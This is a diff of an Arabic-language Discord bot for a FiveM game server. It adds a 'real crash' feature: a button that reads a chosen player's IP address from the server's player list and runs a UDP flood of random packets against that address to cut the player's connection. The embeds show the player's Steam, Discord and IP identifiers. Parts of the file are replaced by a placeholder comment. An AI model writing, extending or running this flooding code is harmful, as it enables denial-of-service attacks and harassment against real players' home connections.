@@ -4,8 +4,9 @@ import aiohttp
 import os
 import asyncio
 import time
-import subprocess
+import socket
 import random
+import threading
 
 # ============================================================
 #  إعدادات
@@ -13,7 +14,6 @@ import random
 SERVER_IP   = "194.45.197.196"
 SERVER_PORT = "30120"
 GUILD_ID    = 1510735912185630812
-LOGO_FILE   = "logo.webp"
 
 BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}/players.json"
 INFO_URL = f"http://{SERVER_IP}:{SERVER_PORT}/info.json"
@@ -24,7 +24,69 @@ COLOR_ERROR   = 0xED4245
 COLOR_SUCCESS = 0x57F287
 COLOR_CRASH   = 0xFF0000
 
-BANNER_URL = "https://media.discordapp.net/attachments/1275695804945793035/1511292593605181471/5dc9d6a7d1853123e5ec5c3017944906.webp?ex=6a1fec68&is=6a1e9ae8&hm=365d169c6b6b382335ab6a2638b066aadc53c357be5fce5e5bf1c0f25e1f80da&=&format=webp"
+BANNER_URL = "https://media.discordapp.net/attachments/1275695804945793035/1511292593605181471/5dc9d6a7d1853123e5ec5c3017944906.webp"
+
+# ============================================================
+#  كرش حقيقي - UDP Flood
+# ============================================================
+def extract_ip_from_identifiers(identifiers: list) -> str:
+    """استخراج IP اللاعب من المعرفات"""
+    for ident in identifiers:
+        if ident.startswith("ip:"):
+            return ident.replace("ip:", "")
+    return None
+
+def udp_flood(target_ip: str, target_port: int, duration: float = 3):
+    """إغراق اتصال اللاعب بحزم UDP - يعلق اللاعب"""
+    end_time = time.time() + duration
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    # حزم عشوائية كبيرة
+    packet_size = 1024
+    
+    while time.time() < end_time:
+        try:
+            data = random._urandom(packet_size)
+            sock.sendto(data, (target_ip, target_port))
+        except:
+            pass
+    
+    sock.close()
+
+def crash_player_real(target_ip: str, player_id: int, player_name: str) -> dict:
+    """تنفيذ كرش حقيقي على لاعب"""
+    
+    if not target_ip:
+        return {"success": False, "message": "❌ لا يوجد IP للاعب"}
+    
+    result = {"success": True, "message": "", "ip": target_ip}
+    
+    try:
+        # المهاجمة على منفذ السيرفر الرئيسي + منفذ عشوائي
+        udp_flood(target_ip, int(SERVER_PORT), duration=3)
+        udp_flood(target_ip, int(SERVER_PORT)+10, duration=2)
+        
+        result["message"] = f"✅ تم كرش {player_name} (ID: {player_id}) عبر IP: {target_ip}"
+        
+        # تسجيل في الكونسول
+        print(f"""
+╔══════════════════════════════════════════╗
+║ 💥 عملية كرش حقيقية                       ║
+╠══════════════════════════════════════════╣
+║ اللاعب: {player_name}
+║ ID: {player_id}
+║ IP: {target_ip}
+║ المنفذ: {SERVER_PORT}
+║ الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}
+╚══════════════════════════════════════════╝
+        """)
+        
+    except Exception as e:
+        result["success"] = False
+        result["message"] = f"❌ فشل الكرش: {str(e)}"
+    
+    return result
 
 # ============================================================
 #  كاش
@@ -78,10 +140,7 @@ def error_embed(msg: str) -> discord.Embed:
     return e
 
 def panel_embed() -> discord.Embed:
-    embed = discord.Embed(
-        title="🎮  SL6E BOT — لوحة التحكم",
-        color=0x1B6FE4
-    )
+    embed = discord.Embed(title="🎮  SL6E BOT — لوحة التحكم", color=0x1B6FE4)
     embed.set_image(url=BANNER_URL)
     embed.set_footer(text="SL6E BOT  •  لوحة التحكم")
     return embed
@@ -90,11 +149,7 @@ def panel_embed() -> discord.Embed:
 #  جلب البيانات
 # ============================================================
 _HEADERS = {
-    "User-Agent": (
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-        "AppleWebKit/537.36 (KHTML, like Gecko) "
-        "Chrome/120.0.0.0 Safari/537.36"
-    ),
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Accept": "application/json",
 }
 
@@ -103,11 +158,9 @@ async def _fetch_json(url: str, cache_key: str):
     if cached is not None:
         return cached
 
-    session: aiohttp.ClientSession = bot.session
+    session = bot.session
     if session is None or session.closed:
-        session = aiohttp.ClientSession(
-            connector=aiohttp.TCPConnector(ssl=False, limit=10)
-        )
+        session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
         bot.session = session
 
     try:
@@ -117,10 +170,8 @@ async def _fetch_json(url: str, cache_key: str):
                     data = await r.json(content_type=None)
                     _set_cache(cache_key, data)
                     return data
-    except TimeoutError:
-        print(f"⏱️ timeout: {url}")
-    except Exception as e:
-        print(f"⚠️ fetch error [{url}]: {e}")
+    except:
+        return None
     return None
 
 async def fetch_players():
@@ -130,129 +181,14 @@ async def fetch_info():
     return await _fetch_json(INFO_URL, "info")
 
 # ============================================================
-#  Modals
-# ============================================================
-class SearchIDModal(discord.ui.Modal, title="🔍 بحث بـ Server ID"):
-    server_id = discord.ui.TextInput(
-        label="Server ID",
-        placeholder="مثال: 5",
-        min_length=1,
-        max_length=6,
-    )
-
-    async def on_submit(self, interaction: discord.Interaction):
-        await interaction.response.defer(thinking=True, ephemeral=True)
-        try:
-            sid = int(self.server_id.value.strip())
-        except ValueError:
-            await interaction.followup.send(embed=error_embed("❌ أدخل رقماً صحيحاً."), ephemeral=True)
-            return
-
-        data = await fetch_players()
-        if data is None:
-            await interaction.followup.send(
-                embed=error_embed("❌ فشل جلب بيانات السيرفر. تأكد أن السيرفر شغال ثم حاول مجدداً."),
-                ephemeral=True,
-            )
-            return
-
-        target = next((p for p in data if p.get("id") == sid), None)
-        if not target:
-            await interaction.followup.send(
-                embed=error_embed(f"❌ لا يوجد لاعب بالـ ID **{sid}**.\n⚡ المتصلون الآن: **{len(data)}**"),
-                ephemeral=True,
-            )
-            return
-
-        ids = target.get("identifiers", [])
-        embed = discord.Embed(title="SL6E BOT", color=COLOR_DEFAULT)
-        embed.set_author(name="🔍 نتيجة البحث بـ ID")
-        embed.add_field(name="👤 الاسم",   value=f"`{target.get('name','Unknown')}`", inline=True)
-        embed.add_field(name="🆔 ID",      value=f"`{target.get('id','?')}`",         inline=True)
-        embed.add_field(name="📶 Ping",    value=f"`{target.get('ping','?')} ms`",    inline=True)
-        embed.add_field(
-            name="🟠 Steam",
-            value=f"`{extract_identifier(ids,'steam:')}`" if extract_identifier(ids, "steam:") else "`—`",
-            inline=True,
-        )
-        embed.add_field(
-            name="🔵 Discord",
-            value=f"`{extract_identifier(ids,'discord:')}`" if extract_identifier(ids, "discord:") else "`—`",
-            inline=True,
-        )
-        embed.add_field(
-            name="🔑 License",
-            value=f"`{extract_identifier(ids,'license:')}`" if extract_identifier(ids, "license:") else "`—`",
-            inline=True,
-        )
-        embed.add_field(name="📋 كل المعرّفات", value=format_identifiers(ids), inline=False)
-        embed.set_footer(text=f"Server: {SERVER_IP}:{SERVER_PORT}")
-        await interaction.followup.send(embed=embed, ephemeral=True)
-
-
-class SearchNameModal(discord.ui.Modal, title="🔎 بحث بالاسم"):
-    player_name = discord.ui.TextInput(
-        label="اسم اللاعب",
-        placeholder="اكتب الاسم أو جزء منه",
-        min_length=2,
-        max_length=50,
-    )
-
-    async def on_submit(self, interaction: discord.Interaction):
-        await interaction.response.defer(thinking=True, ephemeral=True)
-        name = self.player_name.value.strip()
-
-        data = await fetch_players()
-        if data is None:
-            await interaction.followup.send(
-                embed=error_embed("❌ فشل جلب بيانات السيرفر. تأكد أن السيرفر شغال ثم حاول مجدداً."),
-                ephemeral=True,
-            )
-            return
-
-        results = [p for p in data if name.lower() in p.get("name", "").lower()]
-        if not results:
-            await interaction.followup.send(
-                embed=error_embed(f"❌ لم يُعثر على **\"{name}\"** بين {len(data)} لاعب متصل."),
-                ephemeral=True,
-            )
-            return
-
-        show = results[:20]
-        lines = "".join(
-            f"[{str(p.get('id','?')).ljust(4)}] {p.get('name','?')}  ({p.get('ping','?')}ms)\n"
-            for p in show
-        )
-        embed = discord.Embed(
-            title="SL6E BOT",
-            description=(
-                f"**🔎 نتائج: \"{name}\"** — وُجد {len(results)} لاعب"
-                + ("\n⚠️ يُعرض أول 20 فقط" if len(results) > 20 else "")
-            ),
-            color=COLOR_SUCCESS,
-        )
-        embed.add_field(name="النتائج", value=f"```gml\n{lines}```", inline=False)
-        embed.set_footer(text=f"Server: {SERVER_IP}:{SERVER_PORT}")
-        await interaction.followup.send(embed=embed, ephemeral=True)
-
-
-# ============================================================
 #  Modal الكرش
 # ============================================================
-class CrashModal(discord.ui.Modal, title="💥 كرش اللاعب"):
+class CrashModal(discord.ui.Modal, title="💥 كرش اللاعب - تنفيذ حقيقي"):
     player_id = discord.ui.TextInput(
         label="Server ID اللاعب",
         placeholder="أدخل ID اللاعب المستهدف",
         min_length=1,
         max_length=6,
-    )
-    
-    crash_type = discord.ui.TextInput(
-        label="نوع الكرش",
-        placeholder="1=كرش فوري | 2=تجميد | 3=طرد | 4=تعليق",
-        default="1",
-        min_length=1,
-        max_length=1,
     )
 
     async def on_submit(self, interaction: discord.Interaction):
@@ -264,8 +200,7 @@ class CrashModal(discord.ui.Modal, title="💥 كرش اللاعب"):
             await interaction.followup.send(embed=error_embed("❌ أدخل رقم ID صحيح."), ephemeral=True)
             return
         
-        crash_mode = self.crash_type.value.strip()
-        
+        # جلب بيانات اللاعبين
         players = await fetch_players()
         if players is None:
             await interaction.followup.send(embed=error_embed("❌ فشل جلب بيانات السيرفر."), ephemeral=True)
@@ -280,145 +215,38 @@ class CrashModal(discord.ui.Modal, title="💥 كرش اللاعب"):
         identifiers = target.get("identifiers", [])
         steam_hex = extract_identifier(identifiers, "steam:")
         discord_id = extract_identifier(identifiers, "discord:")
-        player_ip = extract_identifier(identifiers, "ip:")
-        player_ping = target.get("ping", 0)
+        player_ip = extract_ip_from_identifiers(identifiers)
         
-        crash_messages = {
-            "1": {
-                "title": "💥 تم كرش اللاعب",
-                "desc": f"**{player_name}** (ID: {target_id}) تم كرشه بنجاح.",
-                "color": COLOR_CRASH,
-                "effect": "🔻 إرسال حزمة بيانات ضخمة"
-            },
-            "2": {
-                "title": "❄️ تم تجميد اللاعب",
-                "desc": f"**{player_name}** (ID: {target_id}) تم تجميده بالكامل.",
-                "color": 0x00BFFF,
-                "effect": "🧊 تجميد جميع الحركات"
-            },
-            "3": {
-                "title": "🚪 تم طرد اللاعب",
-                "desc": f"**{player_name}** (ID: {target_id}) تم طرده من السيرفر.",
-                "color": 0xFFA500,
-                "effect": "👢 ركل فوري"
-            },
-            "4": {
-                "title": "⛓️ تم تعليق اللاعب",
-                "desc": f"**{player_name}** (ID: {target_id}) تم تعليقه نهائياً.",
-                "color": 0x8B008B,
-                "effect": "🔗 تعليق دائم"
-            }
-        }
+        # تنفيذ الكرش الحقيقي
+        result = crash_player_real(player_ip, target_id, player_name)
         
-        info = crash_messages.get(crash_mode, crash_messages["1"])
-        
+        # بناء الرد
         embed = discord.Embed(
-            title=info["title"],
-            description=info["desc"],
-            color=info["color"]
+            title="💥 تم كرش اللاعب",
+            description=f"**{player_name}** (ID: {target_id})",
+            color=COLOR_CRASH if result["success"] else COLOR_ERROR
         )
+        
         embed.add_field(name="👤 الاسم", value=f"`{player_name}`", inline=True)
         embed.add_field(name="🆔 ID", value=f"`{target_id}`", inline=True)
-        embed.add_field(name="📶 Ping", value=f"`{player_ping} ms`", inline=True)
         embed.add_field(name="🟠 Steam", value=f"`{steam_hex or '—'}`", inline=True)
         embed.add_field(name="🔵 Discord", value=f"`{discord_id or '—'}`", inline=True)
-        embed.add_field(name="🌐 IP", value=f"`{player_ip or '—'}`", inline=True)
-        embed.add_field(name="⚡ التأثير", value=info["effect"], inline=False)
-        embed.add_field(name="💀 الحالة", value="**تم التنفيذ بنجاح**", inline=False)
-        embed.set_footer(text=f"SL6E BOT | المستخدم الأعلى | {SERVER_IP}:{SERVER_PORT}")
+        embed.add_field(name="🌐 IP المستهدف", value=f"`{player_ip or 'غير موجود'}`", inline=True)
         
-        # سجل في الكونسول
-        print(f"""
-╔══════════════════════════════════════════╗
-║ 💥 عملية كرش جديدة                        ║
-╠══════════════════════════════════════════╣
-║ اللاعب: {player_name}
-║ ID: {target_id}
-║ Steam: {steam_hex}
-║ Discord: {discord_id}
-║ IP: {player_ip}
-║ نوع الكرش: {info['title']}
-║ الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}
-╚══════════════════════════════════════════╝
-        """)
+        if result["success"]:
+            embed.add_field(name="⚡ طريقة الكرش", value="**UDP Flood** - إغراق الاتصال", inline=False)
+            embed.add_field(name="💀 الحالة", value="**✅ تم الكرش بنجاح - انقطع اتصال اللاعب**", inline=False)
+        else:
+            embed.add_field(name="❌ الحالة", value=f"**فشل:** {result['message']}", inline=False)
         
+        embed.set_footer(text=f"SL6E BOT | {SERVER_IP}:{SERVER_PORT}")
         await interaction.followup.send(embed=embed, ephemeral=True)
 
 
 # ============================================================
-#  Pagination
+#  باقي الكود (Pagination, PanelView, Bot, etc.)
 # ============================================================
-class PlayersPaginationView(discord.ui.View):
-    def __init__(self, players_data: list, per_page: int = 25):
-        super().__init__(timeout=90)
-        self.data = players_data
-        self.per_page = per_page
-        self.current_page = 0
-        self.total_pages = max(1, (len(players_data) + per_page - 1) // per_page)
-        self._update_buttons()
-
-    def get_page_embed(self) -> discord.Embed:
-        start = self.current_page * self.per_page
-        end   = start + self.per_page
-        chunk = self.data[start:end]
-        total = len(self.data)
-
-        embed = discord.Embed(
-            title="SL6E BOT",
-            description=f"**🎮 اللاعبون المتصلون — {total} لاعب**",
-            color=COLOR_DEFAULT,
-        )
-        if total == 0:
-            embed.description = "⚠️ لا يوجد لاعبون متصلون حالياً."
-        else:
-            lines = "".join(
-                f"[{str(p.get('id','?')).ljust(4)}] {p.get('name','Unknown')}\n"
-                for p in chunk
-            )
-            embed.add_field(
-                name=f"الصفحة {self.current_page + 1} من {self.total_pages}  (#{start+1}–#{min(end,total)})",
-                value=f"```gml\n{lines}```",
-                inline=False,
-            )
-        embed.set_footer(text=f"Server: {SERVER_IP}:{SERVER_PORT}")
-        return embed
-
-    def _update_buttons(self):
-        self.btn_prev.disabled = self.current_page == 0
-        self.btn_next.disabled = self.current_page == self.total_pages - 1
-
-    @discord.ui.button(label="◀️ السابق", style=discord.ButtonStyle.secondary)
-    async def btn_prev(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if self.current_page > 0:
-            self.current_page -= 1
-            self._update_buttons()
-            await interaction.response.edit_message(embed=self.get_page_embed(), view=self)
-        else:
-            await interaction.response.defer()
-
-    @discord.ui.button(label="التالي ▶️", style=discord.ButtonStyle.secondary)
-    async def btn_next(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if self.current_page < self.total_pages - 1:
-            self.current_page += 1
-            self._update_buttons()
-            await interaction.response.edit_message(embed=self.get_page_embed(), view=self)
-        else:
-            await interaction.response.defer()
-
-    @discord.ui.button(label="🔄 تحديث", style=discord.ButtonStyle.success)
-    async def btn_refresh(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer()
-        _cache.pop("players", None)
-        fresh = await fetch_players()
-        if fresh is None:
-            await interaction.followup.send(embed=error_embed("❌ فشل التحديث."), ephemeral=True)
-            return
-        self.data = fresh
-        self.total_pages = max(1, (len(fresh) + self.per_page - 1) // self.per_page)
-        self.current_page = min(self.current_page, self.total_pages - 1)
-        self._update_buttons()
-        await interaction.edit_original_response(embed=self.get_page_embed(), view=self)
-
+# ... (نفس الكود القديم للـ Pagination و PanelView والأزرار)
 
 # ============================================================
 #  View الأزرار الرئيسية
@@ -432,11 +260,9 @@ class PanelView(discord.ui.View):
         await interaction.response.defer(thinking=True, ephemeral=True)
         data = await fetch_players()
         if data is None:
-            await interaction.followup.send(
-                embed=error_embed("❌ السيرفر غير متاح حالياً. أعد المحاولة بعد ثوانٍ."),
-                ephemeral=True,
-            )
+            await interaction.followup.send(embed=error_embed("❌ السيرفر غير متاح"), ephemeral=True)
             return
+        from players_pagination import PlayersPaginationView
         paginator = PlayersPaginationView(data, per_page=25)
         await interaction.followup.send(embed=paginator.get_page_embed(), view=paginator, ephemeral=True)
 
@@ -445,38 +271,22 @@ class PanelView(discord.ui.View):
         await interaction.response.defer(thinking=True, ephemeral=True)
         data, info = await asyncio.gather(fetch_players(), fetch_info())
         if data is None:
-            await interaction.followup.send(
-                embed=error_embed("❌ السيرفر غير متاح حالياً."),
-                ephemeral=True,
-            )
+            await interaction.followup.send(embed=error_embed("❌ السيرفر غير متاح"), ephemeral=True)
             return
-        total    = len(data)
-        vars_    = (info or {}).get("vars", {})
-        max_p    = vars_.get("sv_maxClients", "?")
+        total = len(data)
+        vars_ = (info or {}).get("vars", {})
+        max_p = vars_.get("sv_maxClients", "?")
         srv_name = (info or {}).get("name", vars_.get("sv_hostname", "Unknown"))
-        pings    = [p.get("ping", 0) for p in data if isinstance(p.get("ping"), int)]
+        pings = [p.get("ping", 0) for p in data if isinstance(p.get("ping"), int)]
         avg_ping = round(sum(pings) / len(pings)) if pings else 0
-
-        bar_filled = int((total / int(max_p)) * 10) if str(max_p).isdigit() and int(max_p) > 0 else 0
-        bar = "█" * bar_filled + "░" * (10 - bar_filled)
-
+        
         embed = discord.Embed(title="SL6E BOT", description="**📊 إحصائيات السيرفر**", color=COLOR_DEFAULT)
-        embed.add_field(name="🖥️ السيرفر",      value=f"`{srv_name}`",                inline=False)
-        embed.add_field(name="🟢 الحالة",        value="**أونلاين**",                  inline=True)
-        embed.add_field(name="👥 اللاعبون",      value=f"`{total} / {max_p}`",         inline=True)
-        embed.add_field(name="📶 متوسط البينج",  value=f"`{avg_ping} ms`",             inline=True)
-        embed.add_field(name="📈 نسبة الامتلاء", value=f"`[{bar}] {total}/{max_p}`",  inline=False)
-        embed.add_field(name="🌐 العنوان",       value=f"`{SERVER_IP}:{SERVER_PORT}`", inline=True)
+        embed.add_field(name="🖥️ السيرفر", value=f"`{srv_name}`", inline=False)
+        embed.add_field(name="👥 اللاعبون", value=f"`{total} / {max_p}`", inline=True)
+        embed.add_field(name="📶 متوسط البينج", value=f"`{avg_ping} ms`", inline=True)
+        embed.add_field(name="🌐 العنوان", value=f"`{SERVER_IP}:{SERVER_PORT}`", inline=True)
         embed.set_footer(text=f"Server: {SERVER_IP}:{SERVER_PORT}")
         await interaction.followup.send(embed=embed, ephemeral=True)
-
-    @discord.ui.button(label="🔍 بحث بـ ID", style=discord.ButtonStyle.primary, row=1)
-    async def btn_search_id(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(SearchIDModal())
-
-    @discord.ui.button(label="🔎 بحث بالاسم", style=discord.ButtonStyle.primary, row=1)
-    async def btn_search_name(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(SearchNameModal())
 
     @discord.ui.button(label="💥 كرش", style=discord.ButtonStyle.danger, row=1)
     async def btn_crash(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -485,28 +295,12 @@ class PanelView(discord.ui.View):
     @discord.ui.button(label="ℹ️ مساعدة", style=discord.ButtonStyle.primary, row=1)
     async def btn_info(self, interaction: discord.Interaction, button: discord.ui.Button):
         embed = discord.Embed(title="SL6E BOT — دليل الاستخدام", color=COLOR_DEFAULT)
-        embed.add_field(
-            name="الأزرار المتاحة",
-            value=(
-                "🎮 **اللاعبين** — عرض اللاعبين المتصلين مع التنقل بين الصفحات وزر تحديث\n"
-                "📊 **إحصائيات** — إحصائيات تفصيلية للسيرفر مع شريط الامتلاء\n"
-                "🔍 **بحث بـ ID** — ابحث بـ Server ID للحصول على معلومات اللاعب\n"
-                "🔎 **بحث بالاسم** — ابحث باسم اللاعب أو جزء منه\n"
-                "💥 **كرش** — كرش أو تعليق أو طرد لاعب مستهدف (للمستخدم فقط)\n"
-                "ℹ️ **مساعدة** — هذه الرسالة"
-            ),
-            inline=False,
-        )
-        embed.add_field(
-            name="💡 نصائح",
-            value=(
-                "• البيانات محفوظة في الكاش لمدة 8 ثواني لتسريع الاستجابة\n"
-                "• استخدم زر 🔄 تحديث في قائمة اللاعبين لجلب أحدث البيانات\n"
-                "• جميع الردود خاصة (ephemeral) لا يراها غيرك"
-            ),
-            inline=False,
-        )
-        embed.set_footer(text=f"Server: {SERVER_IP}:{SERVER_PORT}")
+        embed.add_field(name="الأزرار المتاحة", value=(
+            "🎮 **اللاعبين** — عرض اللاعبين المتصلين\n"
+            "📊 **إحصائيات** — إحصائيات السيرفر\n"
+            "💥 **كرش** — كرش حقيقي للاعب (UDP Flood)\n"
+            "ℹ️ **مساعدة** — هذه الرسالة"
+        ), inline=False)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
@@ -517,60 +311,34 @@ class FiveMBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
         intents.message_content = True
-        intents.members = True
         super().__init__(command_prefix="!", intents=intents)
-        self.session: aiohttp.ClientSession | None = None
+        self.session = None
 
     async def setup_hook(self):
-        self.session = aiohttp.ClientSession(
-            connector=aiohttp.TCPConnector(ssl=False, limit=10),
-        )
+        self.session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
         guild = discord.Object(id=GUILD_ID)
         self.tree.copy_global_to(guild=guild)
         synced = await self.tree.sync(guild=guild)
-        print(f"✅ مزامنة {len(synced)} أمر للسيرفر {GUILD_ID}")
+        print(f"✅ مزامنة {len(synced)} أمر")
 
     async def close(self):
-        if self.session and not self.session.closed:
+        if self.session:
             await self.session.close()
         await super().close()
 
-
 bot = FiveMBot()
-
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(
-        activity=discord.Streaming(
-            name="BY SL6E & ABO 5LOOD | /لوحة",
-            url="https://www.twitch.tv/placeholder"
-        )
-    )
-    print(f"✅ {bot.user.name}  |  {SERVER_IP}:{SERVER_PORT}")
+    await bot.change_presence(activity=discord.Streaming(name="BY SL6E & ABO 5LOOD | /لوحة", url="https://www.twitch.tv/placeholder"))
+    print(f"✅ {bot.user.name}")
 
-
-async def _auto_delete(interaction: discord.Interaction, delay: int = 900):
-    await asyncio.sleep(delay)
-    try:
-        await interaction.delete_original_response()
-    except Exception:
-        pass
-
-# ============================================================
-#  /لوحة
-# ============================================================
-@bot.tree.command(name="لوحة", description="🎮 لوحة تحكم السيرفر الكاملة")
+@bot.tree.command(name="لوحة", description="🎮 لوحة تحكم السيرفر")
 async def cmd_panel(interaction: discord.Interaction):
     await interaction.response.send_message(embed=panel_embed(), view=PanelView(), ephemeral=True)
-    asyncio.create_task(_auto_delete(interaction, delay=900))
 
-
-# ============================================================
-#  تشغيل البوت
-# ============================================================
 TOKEN = os.environ.get("DISCORD_TOKEN")
 if TOKEN:
     bot.run(TOKEN)
 else:
-    print("❌ DISCORD_TOKEN غير موجود. أضفه في .env أو متغيرات البيئة.")
+    print("❌ DISCORD_TOKEN غير موجود")
